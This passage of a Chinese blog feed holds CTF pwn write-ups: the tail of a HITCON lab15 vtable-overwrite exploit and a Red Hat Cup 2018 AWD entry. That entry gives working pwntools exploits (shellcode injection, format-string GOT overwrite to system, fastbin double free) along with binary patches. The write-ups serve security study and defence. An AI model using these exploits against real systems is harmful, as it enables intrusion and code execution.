class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/kira/HITCON-Training/LAB/lab15/zoo&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>漏洞点在<code>strcpy</code>，没有限制长度，可以覆盖其他chunk：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span> <span class="keyword">public</span> Animal&#123;</span><br><span class="line"><span class="keyword">public</span> :</span><br><span class="line">Dog(<span class="built_in">string</span> str,<span class="keyword">int</span> w)&#123;</span><br><span class="line"><span class="built_in">strcpy</span>(name,str.c_str());</span><br><span class="line">weight = w ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"Wow ~ Wow ~ Wow ~"</span> &lt;&lt; <span class="built_in">endl</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">                ...</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>程序没有开nx，可以在<code>nameofzoo</code>里面放shellcode，覆盖vtable的指针即可。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'DEBUG'</span>) </span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">p = process(<span class="string">'./zoo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_dog</span><span class="params">(name,weight)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(weight))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_ani</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,"b *0x40193E\nc\n")</span></span><br><span class="line">nameofzoo = <span class="number">0x605420</span></span><br><span class="line">p.sendlineafter(<span class="string">":"</span>, sc + p64(nameofzoo))</span><br><span class="line">add_dog(<span class="string">"a"</span>*<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">add_dog(<span class="string">"b"</span>*<span class="number">8</span>,<span class="number">1</span>)</span><br><span class="line">remove_ani(<span class="number">0</span>)</span><br><span class="line">fake_vptr = nameofzoo + len(sc)</span><br><span class="line">add_dog(<span class="string">"c"</span>*<span class="number">72</span> + p64(fake_vptr),<span class="number">2</span>)</span><br><span class="line">listen(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Outline&quot;&gt;&lt;a href=&quot;#Outline&quot; class=&quot;headerlink&quot; title=&quot;Outline&quot;&gt;&lt;/a&gt;Outline&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Basic Knowledge&lt;ul&gt;
&lt;li&gt;Introduction&lt;ul&gt;
&lt;li
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>红帽杯2018线下赛AWD PWN(更新格式化字符利用)</title>
    <link href="https://4f-kira.github.io/2018/06/01/redhat2018-awd-pwn/"/>
    <id>https://4f-kira.github.io/2018/06/01/redhat2018-awd-pwn/</id>
    <published>2018-06-01T03:20:07.000Z</published>
    <updated>2018-06-05T05:29:07.641Z</updated>
    
    <content type="html"><![CDATA[<p>今年红帽杯给web题恶心到了，刚备份的代码已经有某国企的3个不死马，不知道如何做到这么快的，题目质量也堪忧，跟去年的没法比。比赛过程花太多时间在web，都没好好看看pwn，其实很简单，血亏T_T….</p><h3 id="保护情况"><a href="#保护情况" class="headerlink" title="保护情况"></a>保护情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+10h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  sub_CC2();                                    <span class="comment">// 初始化</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"[HFS V0.0.1]"</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"&gt;&gt;&gt;"</span>, a2);</span><br><span class="line">    a2 = (<span class="keyword">char</span> **)(&amp;dword_30 + <span class="number">2</span>);</span><br><span class="line">    get_str(s2, <span class="number">50</span>);</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      a2 = (<span class="keyword">char</span> **)s2;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)qword_202100[i], s2) ) <span class="comment">//下断点</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;savedregs )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">        ls();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        touch();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"bye!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        rm();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        su();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        sh();                                   </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(s2, a2);                         <span class="comment">// 格式化字符</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" :command not found!"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看样子是一个自己实现的shell，至于有哪些命令，可以下个断点去看看，发现只有<code>ls touch rm su sh exit</code>6个命令。</p><h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p>程序本来是开启了NX，不过留意一下初始化的函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; ++i )</span><br><span class="line">    qword_202100[i] = (__int64)<span class="built_in">malloc</span>(<span class="number">0x14</span>uLL);</span><br><span class="line">  v0 = qword_202100[<span class="number">0</span>];</span><br><span class="line">  *(_WORD *)qword_202100[0] = 'sl';</span><br><span class="line">  *(_BYTE *)(v0 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v1 = qword_202108;</span><br><span class="line">  *(_DWORD *)qword_202108 = 'cuot';</span><br><span class="line">  *(_WORD *)(v1 + <span class="number">4</span>) = <span class="number">104</span>;</span><br><span class="line">  v2 = qword_202110;</span><br><span class="line">  *(_DWORD *)qword_202110 = 'tixe';</span><br><span class="line">  *(_BYTE *)(v2 + <span class="number">4</span>) = <span class="number">0</span>;</span><br><span class="line">  v3 = qword_202118;</span><br><span class="line">  *(_WORD *)qword_202118 = 'mr';</span><br><span class="line">  *(_BYTE *)(v3 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v4 = qword_202120;</span><br><span class="line">  *(_WORD *)qword_202120 = 'us';</span><br><span class="line">  *(_BYTE *)(v4 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v5 = qword_202128;</span><br><span class="line">  *(_WORD *)qword_202128 = 'hs';</span><br><span class="line">  *(_BYTE *)(v5 + <span class="number">2</span>) = <span class="number">0</span>;</span><br><span class="line">  v6 = time(<span class="number">0L</span>L);</span><br><span class="line">  srand(v6);</span><br><span class="line">  v7 = rand();</span><br><span class="line">  src = (<span class="keyword">char</span> *)mmap(</span><br><span class="line">                  (<span class="keyword">void</span> *)(((v7 + <span class="number">16</span>) &lt;&lt; <span class="number">12</span>) + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((v7 + <span class="number">16</span>) &lt;&lt; <span class="number">12</span>) &gt;= <span class="number">0xFFFFFFFF</span>)),</span><br><span class="line">                  <span class="number">0x1000</span>uLL,</span><br><span class="line">                  <span class="number">7</span>,</span><br><span class="line">                  <span class="number">50</span>,</span><br><span class="line">                  <span class="number">-1</span>,</span><br><span class="line">                  <span class="number">0L</span>L);</span><br><span class="line">  v8 = src;</span><br><span class="line">  *(_QWORD *)src = '$4�\x01\v eh';</span><br><span class="line">  *((_QWORD *)v8 + 1) = 'no�H\x01\x01\x01\x01';</span><br><span class="line">  *((_QWORD *)v8 + 2) = 'HPeineD ';</span><br><span class="line">  *((_QWORD *)v8 + 3) = 'ssimreP�';</span><br><span class="line">  *((_QWORD *)v8 + 4) = '_\x01jX\x01jPi';</span><br><span class="line">  *((_QWORD *)v8 + 5) = '\x05\x0F��HZ\x13j';</span><br><span class="line">  *((_WORD *)v8 + 24) = '��';</span><br><span class="line">  v8[<span class="number">50</span>] = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br></pre></td></tr></table></figure></p><p>可以留意到程序初始化了几个命令，并且将src的内存段mmap了，那么src可以执行shellcode。然后转到<code>su()</code>看看<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">dest = s2;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x7D0</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please input verify code:"</span>, <span class="number">0L</span>L);</span><br><span class="line">  get_str(src, <span class="number">2018</span>); </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1999</span> &amp;&amp; src[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !(src[i] &amp; <span class="number">1</span>) &amp;&amp; src[i] != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"invalid"</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src); </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"check passed,enjoy!"</span>);</span><br></pre></td></tr></table></figure></p><p>这里可以对<code>src</code>进行写入，直接写shellcode好了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo1</span><span class="params">()</span>:</span></span><br><span class="line">    shellcode = asm(shellcraft.sh())</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'su'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'code:'</span>,shellcode)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,<span class="string">'sh'</span>)</span><br><span class="line">    p.sendline(<span class="string">'cat /flag'</span>)</span><br></pre></td></tr></table></figure><h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><p>输错命令就可以直接触发漏洞，这里可以用来泄露程序基址，libc基址和stack地址<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_elf</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"%8$p"</span>)</span><br><span class="line">    init_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    init_offset = <span class="number">0x56427404f3c0</span> - <span class="number">0x56427404e000</span></span><br><span class="line">    elf.base = init_addr - init_offset</span><br><span class="line">    success(<span class="string">'elf.base:%s'</span> %hex(elf.base))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"%9$p"</span>)</span><br><span class="line">    libc_start_main_addr = int(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    libc_start_main_offset = libc.symbols[<span class="string">"__libc_start_main"</span>]</span><br><span class="line">    libc.base = libc_start_main_addr - libc_start_main_offset - <span class="number">0xf0</span></span><br><span class="line">    success(<span class="string">'libc.base:%s'</span> %hex(libc.base))</span><br></pre></td></tr></table></figure></p><p>由于字符串存在bss段，利用方法比较麻烦，思路是利用stack上的地址进行跳转，修改printf@got.plt<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">leak_elf()</span><br><span class="line">leak_libc()</span><br><span class="line">rbp_addr = leak_stack() - <span class="number">0xe8</span> </span><br><span class="line">success(<span class="string">'rbp_addr:%s'</span> %hex(rbp_addr))</span><br><span class="line"><span class="comment">#step1:overwrite stack to stack  # printf@got.plt 0x202048</span></span><br><span class="line">payload = hn((rbp_addr+<span class="number">0x28</span>) &amp; <span class="number">0xffff</span>,(<span class="number">6</span>+<span class="number">0x5</span>))  <span class="comment"># 0x7ffe2168cb48 -&gt; 0x7ffe2168ca88</span></span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">6</span>+<span class="number">0x13</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step2:overwrite stack to printf@got.plt</span></span><br><span class="line">payload = hhn((elf.got[<span class="string">'printf'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x21</span>)</span><br><span class="line">payload += hn((elf.got[<span class="string">'printf'</span>] &amp; <span class="number">0xffff</span>)-(elf.got[<span class="string">'printf'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x1f</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step3:overwrite stack to stack</span></span><br><span class="line">payload = hn((rbp_addr+<span class="number">0x40</span>) &amp; <span class="number">0xffff</span>,(<span class="number">6</span>+<span class="number">0x5</span>)) </span><br><span class="line">payload += hn(<span class="number">2</span>,<span class="number">6</span>+<span class="number">0x13</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step4:overwrite stack to printf@got.plt+2</span></span><br><span class="line">payload = hhn((elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x21</span>)</span><br><span class="line">payload += hn((elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &amp; <span class="number">0xffff</span>)-(elf.got[<span class="string">'printf'</span>]+<span class="number">2</span> &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x1f</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#step5:overwrite printf@got.plt to system@plt</span></span><br><span class="line">payload = hhn((libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0xa</span>)</span><br><span class="line">payload += hn((libc.symbols[<span class="string">'system'</span>] &amp; <span class="number">0xffff</span>)-(libc.symbols[<span class="string">'system'</span>] &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span>),<span class="number">6</span>+<span class="number">0x7</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt;&gt;&gt;'</span>,payload+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="fastbin-attach"><a href="#fastbin-attach" class="headerlink" title="fastbin attach"></a>fastbin attach</h3><p>malloc的大小可控，可以用fastbin dup来修改free@got.plt</p><p>由于固定输入读取长度是90，可以直接溢出。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">touch</span><span class="params">(size,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"touch"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size:"</span>,str(size))</span><br><span class="line">p.sendlineafter(<span class="string">"content:"</span>,content)</span><br><span class="line">p.recvuntil(<span class="string">'\n'</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ls</span><span class="params">()</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt;&gt;&gt;"</span>,<span class="string">"rm"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Index:"</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo2</span><span class="params">()</span>:</span></span><br><span class="line">leak_elf()</span><br><span class="line">leak_libc()</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'0'</span>) <span class="comment">#0</span></span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'1'</span>) <span class="comment">#1</span></span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'cat /flag\x00'</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">rm(<span class="number">1</span>)</span><br><span class="line">rm(<span class="number">0</span>)</span><br><span class="line">fake = elf.address + <span class="number">0x202018</span> - <span class="number">0x1e</span></span><br><span class="line">touch(<span class="number">0x10</span>,p64(fake))</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'2'</span>)</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'3'</span>)</span><br><span class="line">touch(<span class="number">0x10</span>,<span class="string">'\x00'</span>*<span class="number">0xe</span>+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">rm(<span class="number">2</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure></p><h3 id="patch方法"><a href="#patch方法" class="headerlink" title="patch方法"></a>patch方法</h3><h4 id="shellcode："><a href="#shellcode：" class="headerlink" title="shellcode："></a>shellcode：</h4><p>直接修改shellcode的输入长度<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"Please input verify code:"</span>, <span class="number">0L</span>L);</span><br><span class="line">get_str(src, <span class="number">16</span>);</span><br></pre></td></tr></table></figure></p><h4 id="double-free："><a href="#double-free：" class="headerlink" title="double free："></a>double free：</h4><p>修改检查标识位校验，防止double free<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">9</span> &amp;&amp; *(_QWORD *)&amp;used_tag[<span class="number">2</span> * v1] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)file_list[v1]);</span><br><span class="line">  used_tag[v1] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><h4 id="格式化字符串："><a href="#格式化字符串：" class="headerlink" title="格式化字符串："></a>格式化字符串：</h4><p><code>printf</code> 改 <code>puts</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(s2);                              </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">" :command not found!"</span>, a2);</span><br></pre></td></tr></table></figure></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>不知道还有没有其他的利用方法，有大佬知道的麻烦告知。最后说一句，垃圾比赛~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今年红帽杯给web题恶心到了，刚备份的代码已经有某国企的3个不死马，不知道如何做到这么快的，题目质量也堪忧，跟去年的没法比。比赛过程花太多时间在web，都没好好看看pwn，其实很简单，血亏T_T….&lt;/p&gt;
&lt;h3 id=&quot;保护情况&quot;&gt;&lt;a href=&quot;#保护情况&quot; cla
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://4f-kira.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>广东红帽杯2018 writeup</title>
    <link href="https://4f-kira.github.io/2018/05/02/redhat2018/"/>
    <id>https://4f-kira.github.io/2018/05/02/redhat2018/</id>
    <published>2018-05-02T01:32:21.000Z</published>
    <updated>2018-05-02T01:36:18.992Z</updated>
    
